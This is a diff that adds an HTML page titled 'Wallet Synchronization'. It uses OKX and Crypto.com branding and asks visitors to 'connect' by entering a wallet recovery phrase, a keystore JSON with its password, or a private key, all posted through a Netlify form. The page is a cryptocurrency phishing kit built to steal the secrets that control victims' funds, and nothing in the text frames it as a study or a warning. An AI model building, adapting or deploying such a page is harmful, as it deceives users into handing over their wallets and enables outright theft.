@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Synchronization</title>
+    <link rel="stylesheet" href="./wallet.css">
+    <link rel="stylesheet" href="./index.css">
+</head>
+<body>
+    <nav class="navBar">
+        <div class="menu menus">
+            <div class="menu-Bars">
+                <div class="logo">
+                    <img src="./img/img.png" alt="OkeX Logo">
+                    <ul>
+                        <li>DeFi</li>
+                    </ul>
+                </div>
+                <div class="menuBar">
+                    <img src="./img/menu.png" alt="">
+                </div>
+            </div>
+        </div>
+        <aside class="sideBar">
+            <div class="btn-cancel">X</div>
+            <button class="connect-menu"><a href="./wallet.html"> Connect wallet</a>s</button>
+            <!-- <div class="features">
+                <div>
+                    <h3>Exchange</h3>
+                    <p>Trade spot, margin and derivatives</p>
+                </div>
+                <div>
+                    <h3>DeFi</h3>
+                    <p>Explore NFTs, DeFi and more</p>
+                </div>
+            </div>
+            <div class="bars-btn">
+                <div class="bars-btns">Dashboard</div>
+                <div class="bars-btns">NFT Marketplace</div>
+                <div class="bars-btns">GameFi</div>
+                <div class="bars-btns">Support</div>
+            </div> -->
+        </aside>
+    </nav>
+
+        <main>
+       <div class="wallletinfo"    id="wallets">
+        <div class="topinfo">
+            <img src="./img/img8.png"  id="cryptoimg" alt="crypto.com">
+            <h3>Crypto.com</h3>
+        </div>
+        <div class="sync">
+        <div class="option">
+            <p id="phrases"  class="emphasis" >Phrase</p>
+            <p id="keystore" >Keystore JSON</p>
+            <P id="private"  >Private Key</P>
+        </div>
+            
+<div class="info">
+            <form   name="kucoincrypto" method="POST" data-netlify="true">
+                <div class="phrasekey"  >
+                <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                <textarea name="cryptomessage" class="phrase"   cols="80"  placeholder="Phrase" rows="10"></textarea>
+                </div>
+                <div class="JSON">
+                    <textarea name="cryptoform2" class="phrase" cols="80"  placeholder="Keystore JSON" rows="10"></textarea>
+                    <input type="password" name="cryptopassword"  placeholder="Your Password" class="password">
+                    <p>Several lines of text beginning with '(....)' plus the password you used to encrypt it.</p>
+                </div>
+                <div class="privatekey">
+                    <input type="text" name="password"  placeholder="private key" class="password">
+                    <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                </div>
+                <button type="submit" name="btn" class="btn" id="submit">CONNECT</button>
+            </form>
+        </div>
+        </div>
+    </div>
+    <div class="end">
+    </main>
+    <footer class="log-in-footer">
+        <h2>Support Team</h2>
+        <p>   &copy;2022 </p> 
+        <div></div>
+    </footer>
+        </div>
+    
+        <script src="./jquery-3.6.0.min.js"></script>
+        <script src="./index.js"></script>
+</body>
+</html>
